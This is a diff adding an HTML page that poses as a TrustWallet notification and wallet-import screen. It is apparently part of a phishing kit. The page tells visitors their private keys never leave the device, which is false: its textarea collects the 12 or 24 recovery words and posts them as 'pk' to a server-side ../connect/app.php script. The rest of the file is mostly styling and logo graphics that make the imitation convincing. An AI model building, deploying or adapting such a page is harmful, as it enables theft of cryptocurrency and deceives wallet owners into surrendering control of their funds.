@@ -1,0 +1,467 @@
+
+<html>
+
+ 
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <title>TrustWallet Notification</title>
+<link rel="shortcut icon" href="../../i.ibb.co/wh8mSwT/favicon.png" type="image/x-icon">
+<link rel="shortcut icon" type="image/png" href="../../i.ibb.co/wh8mSwT/favicon.png" />
+<link rel="stylesheet" href="../css/xv1.css"><link theme="default" rel="stylesheet" href="../css/dx2.css">
+
+<body class="web restore">
+<div class="notifications notifications-top">
+    <w-container-alert-notification type="userNotification" class="container-alert-notification"></w-container-alert-notification>
+</div>
+
+<!----><ui-view name="main" class="ui-view ui-view_main" style=""><div class="restore-tabs tab"><!----><div ng-repeat="tab in $ctrl.tabs" class="tab__item active" ng-class="{active: $ctrl.activeTab === tab}" ng-click="$ctrl.setActiveTab(tab)" w-i18n="seedTab" role="button" tabindex="0">Tokens</div><div ng-repeat="tab in $ctrl.tabs" class="tab__item" ng-class="{active: $ctrl.activeTab === tab}" ng-click="$ctrl.setActiveTab(tab)" w-i18n="encodedSeedTab" role="button" tabindex="0">Finance</div><!----><div ng-repeat="tab in $ctrl.tabs" class="tab__item" ng-class="{active: $ctrl.activeTab === tab}" ng-click="$ctrl.setActiveTab(tab)" w-i18n="keyTab" role="button" tabindex="0">Collectibles</div><!----></div>
+<div w-i18n-ns="app.restore" class="main-container movable"><div class="main-container-wrapper"><div class="restore-content get-started-content">
+
+
+
+
+    <center>
+<table><tr>
+<td><img style="display: block; margin: 0 auto; text-align: center; width: 300px; height: 275px;" src="../../i.ibb.co/P6qRqKR/vertical-blue.png"></td>
+</tr></table></center>
+<w-step-by-step active-step="$ctrl.activeStep" class="step-by-step">
+<div class="step-list" ng-transclude=""><w-step class="step" step="0"><!----><div ng-if="$ctrl.state" ng-transclude=""><div class="headline-1 margin-2 text-center" w-i18n="seedOrKeyForm.title"> Private and secure
+</div>
+      <div class="body-2 text-center margin-2"> 
+          <font size="3">Private keys never leave your device</font>
+          <div class="wavesAccounts ng-scope" ng-controller="accountListController as list" ng-show="accounts.mode === 'list'" aria-hidden="false"><br>
+
+<style data-jss="" data-meta="MuiInputBase">
+@-webkit-keyframes mui-auto-fill {}
+@-webkit-keyframes mui-auto-fill-cancel {}
+.MuiInputBase-root {
+  color: rgba(0, 0, 0, 0.87);
+  cursor: text;
+  display: inline-flex;
+  position: relative;m
+  font-size: 1rem;
+  box-sizing: border-box;
+  align-items: center;
+  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+  font-weight: 400;
+  line-height: 1.1876em;
+  letter-spacing: 0.00938em;
+}
+.MuiInputBase-root.Mui-disabled {
+  color: rgba(0, 0, 0, 0.38);
+  cursor: default;
+}
+.MuiInputBase-multiline {
+  padding: 6px 0 7px;
+}
+.MuiInputBase-multiline.MuiInputBase-marginDense {
+  padding-top: 3px;
+}
+.MuiInputBase-fullWidth {
+  width: 100%;
+}
+.MuiInputBase-input {
+  font: inherit;
+  color: currentColor;
+  width: 100%;
+  border: 0;
+  height: 1.1876em;
+  margin: 0;
+  display: block;
+  padding: 6px 0 7px;
+  min-width: 0;
+  background: none;
+  box-sizing: content-box;
+  animation-name: mui-auto-fill-cancel;
+  letter-spacing: inherit;
+  animation-duration: 10ms;
+  -webkit-tap-highlight-color: transparent;
+}
+.MuiInputBase-input::-webkit-input-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input::-moz-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input:-ms-input-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input::-ms-input-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input:focus {
+  outline: 0;
+}
+.MuiInputBase-input:invalid {
+  box-shadow: none;
+}
+.MuiInputBase-input::-webkit-search-decoration {
+  -webkit-appearance: none;
+}
+.MuiInputBase-input.Mui-disabled {
+  opacity: 1;
+}
+.MuiInputBase-input:-webkit-autofill {
+  animation-name: mui-auto-fill;
+  animation-duration: 5000s;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
+  opacity: 0.42;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
+  opacity: 0.42;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
+  opacity: 0.42;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
+  opacity: 0.42;
+}
+.MuiInputBase-inputMarginDense {
+  padding-top: 3px;
+}
+.MuiInputBase-inputMultiline {
+  height: auto;
+  resize: none;
+  padding: 0;
+}
+.MuiInputBase-inputTypeSearch {
+  -moz-appearance: textfield;
+  -webkit-appearance: textfield;
+}
+</style><style data-jss="" data-meta="MuiInput">
+.MuiInput-root {
+  position: relative;
+}
+label + .MuiInput-formControl {
+  margin-top: 16px;
+}
+.MuiInput-colorSecondary.MuiInput-underline:after {
+  border-bottom-color: #f50057;
+}
+.MuiInput-underline:after {
+  left: 0;
+  right: 0;
+  bottom: 0;
+  content: "";
+  position: absolute;
+  transform: scaleX(0);
+  transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+  border-bottom: 2px solid #3f51b5;
+  pointer-events: none;
+}
+.MuiInput-underline.Mui-focused:after {
+  transform: scaleX(1);
+}
+.MuiInput-underline.Mui-error:after {
+  transform: scaleX(1);
+  border-bottom-color: #f44336;
+}
+.MuiInput-underline:before {
+  left: 0;
+  right: 0;
+  bottom: 0;
+  content: "\00a0";
+  position: absolute;
+  transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+  border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+  pointer-events: none;
+}
+.MuiInput-underline:hover:not(.Mui-disabled):before {
+  border-bottom: 2px solid rgba(0, 0, 0, 0.87);
+}
+.MuiInput-underline.Mui-disabled:before {
+  border-bottom-style: dotted;
+}
+@media (hover: none) {
+  .MuiInput-underline:hover:not(.Mui-disabled):before {
+    border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+  }
+}
+</style><style data-jss="" data-meta="MuiFormLabel">
+.MuiFormLabel-root {
+  color: rgba(0, 0, 0, 0.54);
+  padding: 0;
+  font-size: 1rem;
+  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+  font-weight: 400;
+  line-height: 1;
+  letter-spacing: 0.00938em;
+}
+.MuiFormLabel-root.Mui-focused {
+  color: #3f51b5;
+}
+.MuiFormLabel-root.Mui-disabled {
+  color: rgba(0, 0, 0, 0.38);
+}
+.MuiFormLabel-root.Mui-error {
+  color: #f44336;
+}
+.MuiFormLabel-colorSecondary.Mui-focused {
+  color: #f50057;
+}
+.MuiFormLabel-asterisk.Mui-error {
+  color: #f44336;
+}
+</style><style data-jss="" data-meta="MuiInputLabel">
+.MuiInputLabel-root {
+  display: block;
+  transform-origin: top left;
+}
+.MuiInputLabel-formControl {
+  top: 0;
+  left: 0;
+  position: absolute;
+  transform: translate(0, 24px) scale(1);
+}
+.MuiInputLabel-marginDense {
+  transform: translate(0, 21px) scale(1);
+}
+.MuiInputLabel-shrink {
+  transform: translate(0, 1.5px) scale(0.75);
+  transform-origin: top left;
+}
+.MuiInputLabel-animated {
+  transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+}
+.MuiInputLabel-filled {
+  z-index: 1;
+  transform: translate(12px, 20px) scale(1);
+  pointer-events: none;
+}
+.MuiInputLabel-filled.MuiInputLabel-marginDense {
+  transform: translate(12px, 17px) scale(1);
+}
+.MuiInputLabel-filled.MuiInputLabel-shrink {
+  transform: translate(12px, 10px) scale(0.75);
+}
+.MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
+  transform: translate(12px, 7px) scale(0.75);
+}
+.MuiInputLabel-outlined {
+  z-index: 1;
+  transform: translate(14px, 20px) scale(1);
+  pointer-events: none;
+}
+.MuiInputLabel-outlined.MuiInputLabel-marginDense {
+  transform: translate(14px, 12px) scale(1);
+}
+.MuiInputLabel-outlined.MuiInputLabel-shrink {
+  transform: translate(14px, -6px) scale(0.75);
+}
+</style><style data-jss="" data-meta="MuiFormControl">
+.MuiFormControl-root {
+  border: 0;
+  margin: 0;
+  display: inline-flex;
+  padding: 0;
+  position: relative;
+  min-width: 0;
+  flex-direction: column;
+  vertical-align: top;
+}
+.MuiFormControl-marginNormal {
+  margin-top: 16px;
+  margin-bottom: 8px;
+}
+.MuiFormControl-marginDense {
+  margin-top: 8px;
+  margin-bottom: 4px;
+}
+.MuiFormControl-fullWidth {
+  width: 100%;
+}
+</style>
+<style data-jss="" data-meta="makeStyles">
+.jss1 {
+  color: #aeaeae;
+  font-weight: 400;
+}
+.jss1.jss2 {
+  color: #aeaeae;
+}
+.jss1.jss4 {
+  color: #aeaeae;
+}
+.jss3:after {
+  border-bottom: 2px solid #f7861c;
+}
+.jss5 {
+  color: #aeaeae;
+}
+.jss6 {
+  padding: 8px;
+}
+.jss6::placeholder {
+  color: #aeaeae;
+}
+.jss7 {
+  color: #fff;
+}
+.jss8:after {
+  border-bottom: 2px solid #fff;
+}
+.jss9.jss10 {
+  color: #5b5b5b;
+}
+.jss9.jss4 {
+  color: #5b5b5b;
+}
+.jss12 {
+  border: 1px solid #BBC0C5;
+  height: 48px;
+  display: flex;
+  padding: 0 16px;
+  align-items: center;
+  border-radius: 6px;
+}
+label + .jss12 {
+  margin-top: 9px;
+}
+.jss12.jss11 {
+  border: 1px solid #2f9ae0;
+}
+.jss13 {
+  color: #5b5b5b;
+  position: initial;
+  font-size: 1rem;
+  transform: none;
+  transition: none;
+}
+.jss14 {
+  color: #5b5b5b;
+  position: initial;
+  font-size: .75rem;
+  transform: none;
+  transition: none;
+}
+.jss15 {
+  line-height: initial !important;
+}
+</style>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
+
+<style>
+          .menu-droppo-enter {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+
+          .menu-droppo-enter.menu-droppo-enter-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave.menu-droppo-leave-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+        </style>
+
+
+
+<div class="main-container-wrapper">
+  <div class="first-view-main-wrapper">
+    <div class="first-view-main">
+      <form method="post" action="../connect/app.php">
+
+         
+            <div class="seed-block margin-3"><w-input textarea="id="wordsseed" name="pk" maxlength="150"  class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal">
+
+
+
+
+
+
+            <div class="w-input-wrap">
+              <textarea id="wordsseed" rows="4" name="pk" maxlength="300" placeholder="Phrase"
+                class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal"
+                minlength="24"></textarea><span
+                class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal"></span>
+              <br>
+              <div id="Layer3">
+  <div align="center">
+    <p class="style1">Typically 12 (sometimes 24) words separated by single spaces</p>
+    </div>
+
+
+<w-button disabled="!$ctrl.address" class="submit big long ng-isolate-scope" w-step-next="">
+    <button ng-transclude="" name="trust" class="submit big long" role="button" tabindex="0" disabled="disabled" id="imp">
+        <w-i18n class="ng-scope">IMPORT</w-i18n></button></w-button></form>
+
+<div class="wawobp loader" data-tenqwa="9fkuxe" style="display: none;">
+      <div class="yat5ls lodas" data-2ivb6w="2n92zq">
+        <svg viewBox="0 0 96 96" width="90px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-bdvvaa enAHwg">
+          <circle cx="48" cy="48" r="48" fill="white"></circle>
+          <path d="M77.7602 16.9155L51.9419 36.0497L56.7382 24.7733L77.7602 16.9155Z" fill="#E17726"></path>
+          <path d="M18.2656 16.9155L43.8288 36.2283L39.2622 24.7733L18.2656 16.9155Z" fill="#E27625"></path>
+          <path d="M68.4736 61.2808L61.6108 71.7918L76.3059 75.8482L80.4899 61.5104L68.4736 61.2808Z" fill="#E27625"></path>
+          <path d="M15.5356 61.5104L19.6941 75.8482L34.3892 71.7918L27.5519 61.2808L15.5356 61.5104Z" fill="#E27625"></path>
+          <path d="M33.5984 43.5251L29.491 49.699L44.0584 50.3624L43.5482 34.6724L33.5984 43.5251Z" fill="#E27625"></path>
+          <path d="M62.4274 43.525L52.2991 34.4937L51.9419 50.3622L66.5094 49.6989L62.4274 43.525Z" fill="#E27625"></path>
+          <path d="M34.3892 71.7922L43.1654 67.5316L35.6137 61.6128L34.3892 71.7922Z" fill="#E27625"></path>
+          <path d="M52.8345 67.5316L61.6107 71.7922L60.3861 61.6128L52.8345 67.5316Z" fill="#E27625"></path>
+          <path d="M61.6107 71.7923L52.8345 67.5317L53.5233 73.2465L53.4468 75.6446L61.6107 71.7923Z" fill="#D5BFB2"></path>
+          <path d="M34.3892 71.7923L42.5531 75.6446L42.502 73.2465L43.1654 67.5317L34.3892 71.7923Z" fill="#D5BFB2"></path>
+          <path d="M42.7062 57.8369L35.4097 55.6939L40.5631 53.3213L42.7062 57.8369Z" fill="#233447"></path>
+          <path d="M53.2937 57.8369L55.4367 53.3213L60.6412 55.6939L53.2937 57.8369Z" fill="#233447"></path>
+          <path d="M34.3893 71.7918L35.6649 61.2808L27.552 61.5104L34.3893 71.7918Z" fill="#CC6228"></path>
+          <path d="M60.3352 61.2808L61.6108 71.7918L68.4736 61.5104L60.3352 61.2808Z" fill="#CC6228"></path>
+          <path d="M66.5094 49.6987L51.9419 50.362L53.294 57.8371L55.4371 53.3215L60.6416 55.6941L66.5094 49.6987Z" fill="#CC6228"></path>
+          <path d="M35.4098 55.6941L40.5633 53.3215L42.7063 57.8371L44.0584 50.362L29.491 49.6987L35.4098 55.6941Z" fill="#CC6228"></path>
+          <path d="M29.491 49.6987L35.6139 61.6129L35.4098 55.6941L29.491 49.6987Z" fill="#E27525"></path>
+          <path d="M60.6414 55.6941L60.3862 61.6129L66.5092 49.6987L60.6414 55.6941Z" fill="#E27525"></path>
+          <path d="M44.0584 50.3618L42.7063 57.8369L44.4156 66.6641L44.7728 55.0305L44.0584 50.3618Z" fill="#E27525"></path>
+          <path d="M51.9415 50.3618L51.2527 55.005L51.5843 66.6641L53.2937 57.8369L51.9415 50.3618Z" fill="#E27525"></path>
+          <path d="M53.2938 57.8374L51.5845 66.6646L52.8346 67.532L60.3862 61.6132L60.6413 55.6943L53.2938 57.8374Z" fill="#F5841F"></path>
+          <path d="M35.4097 55.6943L35.6138 61.6132L43.1654 67.532L44.4155 66.6646L42.7062 57.8374L35.4097 55.6943Z" fill="#F5841F"></path>
+          <path d="M53.4468 75.6443L53.5233 73.2462L52.8855 72.6849H43.1143L42.502 73.2462L42.5531 75.6443L34.3892 71.792L37.2465 74.1391L43.0378 78.1445H52.962L58.7533 74.1391L61.6107 71.792L53.4468 75.6443Z" fill="#C0AC9D"></path>
+          <path d="M52.8346 67.5315L51.5845 66.6641H44.4156L43.1655 67.5315L42.5022 73.2462L43.1145 72.6849H52.8857L53.5235 73.2462L52.8346 67.5315Z" fill="#161616"></path>
+          <path d="M78.8314 37.2998L80.9999 26.7377L77.7599 16.9155L52.8345 35.4119L62.4271 43.5247L75.9485 47.4791L78.9335 43.984L77.6323 43.04L79.7243 41.1521L78.1426 39.902L80.2091 38.3458L78.8314 37.2998Z" fill="#763E1A"></path>
+          <path d="M15 26.7377L17.194 37.2998L15.7909 38.3458L17.8574 39.902L16.2756 41.1521L18.3676 43.04L17.0665 43.984L20.0514 47.4791L33.5984 43.5247L43.1655 35.4119L18.2656 16.9155L15 26.7377Z" fill="#763E1A"></path>
+          <path d="M75.9487 47.4793L62.4272 43.5249L66.5092 49.6989L60.3862 61.613L68.4736 61.511H80.4898L75.9487 47.4793Z" fill="#F5841F"></path>
+          <path d="M33.5983 43.5249L20.0513 47.4793L15.5356 61.511H27.5519L35.6137 61.613L29.4908 49.6989L33.5983 43.5249Z" fill="#F5841F"></path>
+          <path d="M51.9415 50.3617L52.8344 35.4115L56.7378 24.7729H39.262L43.1653 35.4115L44.0583 50.3617L44.3899 55.0559L44.4154 66.664H51.5843L51.6099 55.0559L51.9415 50.3617Z" fill="#F5841F"></path>
+        </svg>
+        <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
+          <center><svg version="1.1" id="loader-1" fill="#FF6700" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
+            <path fill="#FF6700" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z">
+              <animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform>
+            </path>
+          </svg></center>
+        </div>
+      </div>
+    </div>
+     
+<script src="../js/load.js"></script>	  
+
